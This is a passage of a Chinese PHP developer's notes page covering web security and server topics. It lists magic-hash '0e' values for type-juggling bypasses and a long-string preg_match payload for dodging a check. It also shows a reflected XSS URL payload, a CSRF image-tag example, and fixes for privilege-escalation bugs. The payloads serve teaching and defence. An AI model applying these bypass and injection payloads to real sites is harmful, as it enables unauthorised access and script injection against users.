class="number">0e830400451993494058024219903391</span></span><br><span class="line">PJNPDWY: <span class="number">0e291529052894702774557631701704</span></span><br><span class="line">NWWKITQ: <span class="number">0e763082070976038347657360817689</span></span><br><span class="line">NOOPCJF: <span class="number">0e818888003657176127862245791911</span></span><br><span class="line">MMHUWUV: <span class="number">0e701732711630150438129209816536</span></span><br><span class="line">MAUXXQC: <span class="number">0e478478466848439040434801845361</span></span><br><span class="line">IHKFRNS: <span class="number">0e256160682445802696926137988570</span></span><br><span class="line">GZECLQZ: <span class="number">0e537612333747236407713628225676</span></span><br><span class="line">GGHMVOE: <span class="number">0e362766013028313274586933780773</span></span><br><span class="line">GEGHBXL: <span class="number">0e248776895502908863709684713578</span></span><br><span class="line">EEIZDOI: <span class="number">0e782601363539291779881938479162</span></span><br><span class="line">DYAXWCA: <span class="number">0e424759758842488633464374063001</span></span><br><span class="line">DQWRASX: <span class="number">0e742373665639232907775599582643</span></span><br><span class="line">BRTKUJZ: <span class="number">00e57640477961333848717747276704</span></span><br><span class="line">ABJIHVY: <span class="number">0e755264355178451322893275696586</span></span><br><span class="line">aaaXXAYW: <span class="number">0e540853622400160407992788832284</span></span><br><span class="line">aabg7XSs: <span class="number">0e087386482136013740957780965295</span></span><br><span class="line">aabC9RqS: <span class="number">0e041022518165728065344349536299</span></span><br><span class="line">sha1</span><br><span class="line"><span class="number">10932435112</span>: <span class="number">0e07766915004133176347055865026311692244</span></span><br><span class="line">aaroZmOk: <span class="number">0e66507019969427134894567494305185566735</span></span><br><span class="line">aaK1STfY: <span class="number">0e76658526655756207688271159624026011393</span></span><br><span class="line">aaO8zKZF: <span class="number">0e89257456677279068558073954252716165668</span></span><br><span class="line">aa3OFF9m: <span class="number">0e36977786278517984959260394024281014729</span></span><br><span class="line"></span><br><span class="line">crc32 </span><br><span class="line"><span class="number">6586</span>: <span class="number">0e817678</span></span><br><span class="line"></span><br><span class="line">pre_match 在匹配的时候会消耗较大的资源，并且默认存在贪婪匹配，如果传入一个超长的字符串，会导致 pre_match 消耗大量资源从而导致 php 超时，后面的 php 语句就不会执行。payload:</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">$code=<span class="string">"xdsec###AAAAAAAAAAAAAAAAAAA(超多个A)"</span>;</span><br><span class="line">preg_match(<span class="string">"/(\d+)\.(\d+)\.(\d+)\.(\d+)/"</span>, $code));</span><br></pre></td></tr></table></figure>
<h3 id="方法多次调用"><a href="#方法多次调用" class="headerlink" title="方法多次调用"></a>方法多次调用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">https:<span class="comment">//segmentfault.com/a/1190000007210948</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDate</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getCurrentDate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $current_date = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!$current_date) &#123;</span><br><span class="line">            echo <span class="string">'only run one time'</span>;</span><br><span class="line">            usleep(<span class="number">200000</span>);</span><br><span class="line">            $current_date  = date(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $current_date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getCurrentDate2</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        usleep(<span class="number">200000</span>);</span><br><span class="line">        echo <span class="string">'run everytime'</span>;</span><br><span class="line">        <span class="keyword">return</span> date(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$start = microtime(<span class="literal">true</span>);</span><br><span class="line">$i = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">while</span> ($i--) &#123;</span><br><span class="line">    MyDate::getCurrentDate();</span><br><span class="line">&#125;</span><br><span class="line">echo microtime(<span class="literal">true</span>) - $start;    <span class="comment">//200ms</span></span><br><span class="line"></span><br><span class="line">$start = microtime(<span class="literal">true</span>);</span><br><span class="line">$i = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">while</span> ($i--) &#123;</span><br><span class="line">    MyDate::getCurrentDate2();</span><br><span class="line">&#125;</span><br><span class="line">echo microtime(<span class="literal">true</span>) - $start;    <span class="comment">//1s</span></span><br></pre></td></tr></table></figure>
<h3 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">水平越权就是同等角色下的用户，不但能够访问和操作自己私有的数据，还能访问其他人私有的数据，其根本是基于数据的访问权限。</span><br><span class="line"> # 1 删除前鉴权处理</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">destory</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $payment = Payment::find($id);</span><br><span class="line">        <span class="keyword">if</span> ($payment-&gt;user_id != $<span class="keyword">this</span>-&gt;currentUser-&gt;id) &#123;</span><br><span class="line">            <span class="keyword">return</span> ...</span><br><span class="line">        &#125;</span><br><span class="line">        $payment-&gt;<span class="keyword">delete</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 2 参入id查询删除</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">destory</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Payment::whereUserId($<span class="keyword">this</span>-&gt;currentUser-&gt;id)-&gt;whereId($id)-&gt;<span class="keyword">delete</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 3 模型关联查询</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        public <span class="function"><span class="keyword">function</span> <span class="title">payments</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasMany(<span class="string">'App\Payment'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PaymentController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        public <span class="function"><span class="keyword">function</span> <span class="title">destory</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;currentUser-&gt;payments()-&gt;whereId($id)-&gt;<span class="keyword">delete</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">在 findPassword 里面再次验证完成邮箱校验的账户是否为当前找回密码的账号</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        public <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (checkEmail($data[<span class="string">'email'</span>], $data[<span class="string">'code'</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public <span class="function"><span class="keyword">function</span> <span class="title">findPassword</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (checkEmail($data[<span class="string">'email'</span>], $data[<span class="string">'code'</span>])) &#123;</span><br><span class="line">                $user = User::whereEmail($data[<span class="string">'email'</span>])-&gt;first();</span><br><span class="line">                $user-&gt;password = $data[<span class="string">'new_password'</span>];</span><br><span class="line">                $user-&gt;save();</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/articles/28505#topnav</span></span><br></pre></td></tr></table></figure>
<h3 id="限制分页条目"><a href="#限制分页条目" class="headerlink" title="限制分页条目"></a>限制分页条目</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">恶意请求者请求把 pagesize 输入 <span class="number">5000</span>,<span class="number">10000</span> 等甚至更大的数，会给数据库带来一定的压力，localhost/api/articles?pageid=<span class="number">0</span>&amp;pagesize=<span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//用框架自带的分页方法</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $builder = Article::<span class="keyword">with</span>(<span class="string">'category:id,name'</span>)-&gt;orderBy(<span class="string">'id'</span>, <span class="string">'desc'</span>)-&gt;paginate(<span class="number">8</span>);</span><br><span class="line">      <span class="keyword">return</span> response()-&gt;json([<span class="string">'status'</span> =&gt; <span class="literal">true</span>, <span class="string">'count'</span> =&gt; $builder-&gt;total(), <span class="string">'articles'</span> =&gt; $builder-&gt;items()]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        $searchQuery = $_GET[<span class="string">'q'</span>];</span><br><span class="line">        <span class="comment">/* some search magic here */</span></span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;h1&gt;You searched <span class="keyword">for</span>: &lt;?php echo $searchQuery; ?&gt;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">因为我们把用户的内容直接打印出来，不经过任何过滤，非法用户可以拼接 URL： search.php?q=%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E</span></span><br><span class="line"><span class="regexp">PHP 渲染出来的内容如下，可以看到 Javascript 代码会被直接执行：</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">&lt;h1&gt;You searched for: &lt;script&gt;alert(1);&lt;/</span>script&gt;&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;We found: Absolutely nothing because <span class="keyword">this</span> is a demo&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">例如网站上有用户可以用来注销账户的链接。</span><br><span class="line"></span><br><span class="line">&lt;a href=<span class="string">"http://your-website.com/delete-account"</span>&gt;销毁账户&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">如果某个用户评论：</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;img src=”http:/</span><span class="regexp">/your-website.com/</span><span class="keyword">delete</span>-account”&gt; wow</span><br><span class="line">用户将在查看此评论的时候删除他们的账号。</span><br></pre></td></tr></table></figure>
<h3 id="No-input-file-specified"><a href="#No-input-file-specified" class="headerlink" title="No input file specified"></a>No input file specified</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">2019/05/23 12:31:44 [error] 5085#5085: *1 FastCGI sent in stderr: "PHP message: PHP Warning:  Unknown: open_basedir restriction in effect. File(/home/vagrant/Code/haopai-git/public/index.php) is not within the allowed path(s): (/www/wwwroot/dev.guooo.top/:/tmp/:/proc/) in Unknown on line 0</span><br><span class="line">PHP message: PHP Warning:  Unknown: failed to open stream: Operation not permitted <span class="keyword">in</span> Unknown on line <span class="number">0</span></span><br><span class="line">Unable to open primary script: <span class="regexp">/home/</span>vagrant/Code/haopai-git/public/index.php (Operation not permitted)<span class="string">" while reading response header from upstream, client: 192.168.10.1, server: hp.hopa.cc, request: "</span>GET / HTTP/<span class="number">1.1</span><span class="string">", upstream: "</span>fastcgi:<span class="comment">//unix:/var/run/php/php7.2-fpm.sock:", host: "hp.hopa.cc"</span></span><br><span class="line">看到上面的错误，我也去网上找，网上主要是说 ngnix 里面配置 fastcgi_param 的问题，但是我觉得不对吧，因为别的项目都没有问题，单单就这个项目有问题。不知怎么了，我就注意到 <span class="string">"/www/wwwroot/"</span> 这个东西，我电脑里就不应该有这个文件夹啊，于是我就去项目里查找这个字符串，最后在 .user.ini 这个文件找到了，当我看到这个文件的时候我就意识到是他的问题，我把这个文件里面的配置删了。文件内容如下：</span><br><span class="line"></span><br><span class="line">open_basedir=***********</span><br><span class="line">https:<span class="comment">//learnku.com/articles/28858</span></span><br></pre></td></tr></table></figure>
<h3 id="一个简单的composer包"><a href="#一个简单的composer包" class="headerlink" title="一个简单的composer包"></a>一个简单的composer包</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">vi https:<span class="comment">//github.com/jianyan74/php-excel/blob/master/composer.json</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="string">"name"</span>: <span class="string">"jianyan74/php-excel"</span>,</span><br><span class="line">	<span class="string">"description"</span>: <span class="string">"php excel 导入导出"</span>,</span><br><span class="line">	<span class="string">"keywords"</span>: [<span class="string">"excel"</span>, <span class="string">"csv"</span>, <span class="string">"xlsx"</span>, <span class="string">"xls"</span>, <span class="string">"html"</span>, <span class="string">"jianyan74"</span>],</span><br><span class="line">	<span class="string">"license"</span>: <span class="string">"MIT"</span>,</span><br><span class="line">	<span class="string">"authors"</span>: [</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="string">"name"</span>: <span class="string">"jianyan74"</span></span><br><span class="line">		&#125;</span><br><span class="line">	],</span><br><span class="line">	<span class="string">"type"</span>: <span class="string">"extension"</span>,</span><br><span class="line">	<span class="string">"require"</span>: &#123;</span><br><span class="line">		<span class="string">"php"</span>: <span class="string">"&gt;=7.0"</span>,</span><br><span class="line">		<span class="string">"phpoffice/phpspreadsheet"</span>: <span class="string">"^1.3"</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="string">"autoload"</span>: &#123;</span><br><span class="line">		<span class="string">"psr-4"</span>: &#123;</span><br><span class="line">			<span class="string">"jianyan\\excel\\"</span>: <span class="string">"./src"</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vi  </span><br><span class="line">&lt;?php</span><br><span class="line">namespace jianyan\excel;</span><br><span class="line">use Exception;</span><br><span class="line">use PhpOffice\PhpSpreadsheet\Cell\Coordinate;</span><br><span class="line">use PhpOffice\PhpSpreadsheet\Spreadsheet;</span><br><span class="line">use PhpOffice\PhpSpreadsheet\Writer\Html;</span><br><span class="line">use PhpOffice\PhpSpreadsheet\Writer\Xls;</span><br><span class="line">use PhpOffice\PhpSpreadsheet\Writer\Xlsx;</span><br><span class="line">use PhpOffice\PhpSpreadsheet\Writer\Csv;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 导出导入Excel</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Class Excel</span></span><br><span class="line"><span class="comment"> * @package jianyan\excel</span></span><br><span class="line"><span class="comment"> * @author jianyan74 &lt;751393839@qq.com&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Excel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">composer <span class="built_in">require</span> jianyan74/php-excel</span><br><span class="line"></span><br><span class="line">use jianyan\excel\Excel;</span><br><span class="line">Excel::exportData($list, $header)</span><br></pre></td></tr></table></figure>
<h3 id="jwt记录"><a href="#jwt记录" class="headerlink" title="jwt记录"></a>jwt记录</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">JWT 由三部分组成：头部、数据体、签名 / 加密</span><br><span class="line"></span><br><span class="line">这三部分以 . (英文句号) 连接，注意这三部分顺序是固定的，即 header.payload.signature 如下示例：</span><br><span class="line"></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br><span class="line"></span><br><span class="line">Base64url 编码是 Base64 的一种针对 URL 的特定变种。因为 = 、+、/ 这个三个字符在 URL 中是有特定含义的，所以 Base64url 分别将 = 直接忽略，+ 替换成 -，/ 替换成 _</span><br><span class="line">Header 部分：</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">  <span class="string">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br><span class="line">Payload 部分：</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"sub"</span>: <span class="string">"demo"</span>,</span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"xfly"</span>,</span><br><span class="line">  <span class="string">"admin"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">根据 Header 部分的 alg 属性我们可以知道该 JWT 符合 JWS 中的规范，且签名算法是 HS256 也就是 HMAC SHA<span class="number">-256</span> 算法，那么我们就可以根据如下公式计算最后的签名部分：</span><br><span class="line"></span><br><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">"."</span> +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret</span><br><span class="line">)</span><br><span class="line">其中的密钥是保证签名安全性的关键，所以必须保存好，在本例中密钥是 <span class="number">123456</span>。因为有这个密钥的存在，所以即便调用方偷偷的修改了前两部分的内容，在验证环节就会出现签名不一致的情况，所以保证了安全性。</span><br><span class="line">如果有效期设置过长，意味着这个 Token 泄漏后可以被长期利用，危害较大，所以一般我们都会设置一个较短的有效期。由于有效期较短，意味着需要经常进行重新授权的操作。</span><br><span class="line">假设在用户操作过程中升级 / 变更了某些权限，势必需要刷新以更新数据。</span><br><span class="line">要解决这个问题，需要在服务端部署额外逻辑，常见的做法是增加刷新机制和黑名单机制，通过 Refresh Token 刷新 JWT，将需要废弃的 Token 加入到黑名单。</span><br><span class="line">简单科普下非对称式加密算法：有两个密钥，一个公开密钥和一个私有密钥，私钥参与加密，公钥用于解密，巧妙之处是解密只能用公钥来解，即便是加密用的密钥也无法对密文进行解密。你可以看到加密和解密需要两个不同的密钥，故称之为非对称加密。</span><br><span class="line">https:<span class="comment">//learnku.com/articles/28909#reply91329</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-FPM-创建慢日志"><a href="#PHP-FPM-创建慢日志" class="headerlink" title="PHP-FPM 创建慢日志"></a>PHP-FPM 创建慢日志</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">CGI: 是一个协议，规定了 Web 服务器和后端语言的交互。但是性能差点，每个请求都会 fork 一个新的进程。\</span><br><span class="line">FastCGI: 也是一个协议，是 CGI 的升级版，可以在一个进程内处理多个请求 \</span><br><span class="line">FPM：FastCGI 进程管理器，是一个实现了 FastCGI 协议的工具 \</span><br><span class="line">PHP-FPM: 是一个 PHP 的进程管理器，专门给 PHP 使用的 FPM 工具 \</span><br><span class="line"></span><br><span class="line"> Nginx 并不是直接和 PHP 进行通信的，而是通过 PHP-FPM。Nginx 不仅仅是一个强大的 Web 服务器，也是一个强大的代理服务器，提供了很多请求协议的代理。比如 Http 协议还有 FastCgi 协议等。</span><br><span class="line"></span><br><span class="line">当请求进入到 Nginx 中，Nginx 提供了一个 FastCgi 模块 来把 Http 请求映射为对应的 Fastcgi 请求。该模块提供了 fastcgi_param 指定来完成映射关系。它的主要作用就是把 Nginx 中的变量翻译成 PHP 中能够理解的变量。 一般该文件是在 Nginx 的安装目录下，我的内容如下:</span><br><span class="line"></span><br><span class="line">/etc/nginx # cat /etc/nginx/fastcgi_params </span><br><span class="line"></span><br><span class="line">fastcgi_param  QUERY_STRING       $query_string;</span><br><span class="line">fastcgi_param  REQUEST_METHOD     $request_method;</span><br><span class="line">fastcgi_param  CONTENT_TYPE       $content_type;</span><br><span class="line"></span><br><span class="line">.php 结尾的请求都交给 fastcgi 模块处理，然后把处理后的请求发送给 PHP-FPM，然后 PHP-FPM 把请求交给 worker 进程，worker 进程加载 PHP 解析器运行 PHP 处理结果。 其中 fastcgi_pass unix:<span class="regexp">/var/</span>run/php/php7<span class="number">.1</span>-fpm.sock; 这一行用来指定 fpm 的地址</span><br><span class="line"></span><br><span class="line">Nginx 和 PHP 的通信流程大概如下。</span><br><span class="line"></span><br><span class="line">客户端发送请求到 Nginx</span><br><span class="line">加载 nginx.conf 文件，把所有 .php 结尾的请求特殊处理</span><br><span class="line">加载 FastCGI 模块，完成请求参数的解析映射，生成 FastCGI 请求</span><br><span class="line">然后通过 fastcgi_pass 参数把 FastCGI 请求发送给 PHP-FPM 处理</span><br><span class="line">PHP-FPM 收到请求，分配给空闲 worker 子进程</span><br><span class="line">worker 子进程加载 PHP 解析器等 完成 PHP 执行获取结果</span><br><span class="line">PHP-FPM 是一种 master/worker 进程架构。首先会启动一个 master 主进程，主要功能用来完成 PHP 环境的初始化，事件监听，子进程状态管理等等。然后会启动若干 worker 子进程来处理 PHP 请求</span><br><span class="line">测试 php-fpm 配置内容是否正确 使用 -t 参数， 还可以通过加 -c 指定 php.ini 文件，通过 -y 指定 php-fpm.conf</span><br><span class="line">find / -name php-fpm7</span><br><span class="line">/etc/init.d/php-fpm7</span><br><span class="line">/etc/logrotate.d/php-fpm7</span><br><span class="line">/usr/sbin/php-fpm7</span><br><span class="line"></span><br><span class="line">/usr/sbin/php-fpm7 -c /usr/local/php/etc/php.ini -y /usr/local/php/etc/php-fpm.conf -t</span><br><span class="line"></span><br><span class="line">去看 PHP-FPM 的错误日志。在 php-fpm.conf 中增加 error_log = <span class="regexp">/xx/</span>xx/php-fpm.error.log, 然后重启 PHP-FPM，在访问测试连接请求，发现果然有报错</span><br><span class="line"></span><br><span class="line">[<span class="number">17</span>-May<span class="number">-2019</span> <span class="number">10</span>:<span class="number">04</span>:<span class="number">50</span>] NOTICE: fpm is running, pid <span class="number">12</span></span><br><span class="line">[<span class="number">17</span>-May<span class="number">-2019</span> <span class="number">10</span>:<span class="number">04</span>:<span class="number">50</span>] NOTICE: ready to handle connections</span><br><span class="line">[<span class="number">17</span>-May<span class="number">-2019</span> <span class="number">10</span>:<span class="number">05</span>:<span class="number">04</span>] ERROR: failed to ptrace(ATTACH) child <span class="number">22</span>: Operation not permitted (<span class="number">1</span>)</span><br><span class="line">[<span class="number">17</span>-May<span class="number">-2019</span> <span class="number">10</span>:<span class="number">05</span>:<span class="number">04</span>] WARNING: [pool www123] child <span class="number">22</span>, script <span class="string">'/app/www/public/index.php'</span> (request: <span class="string">"GET /index.php"</span>) executing too slow (<span class="number">2.317563</span> sec), logging</span><br><span class="line">显示子进程权限不够，ptrace 调用失败！  master 进程为了监控子进程需要调用 ptrace 来实现对子进程监控和追踪，但是调用 ptrace 却失败了  https:<span 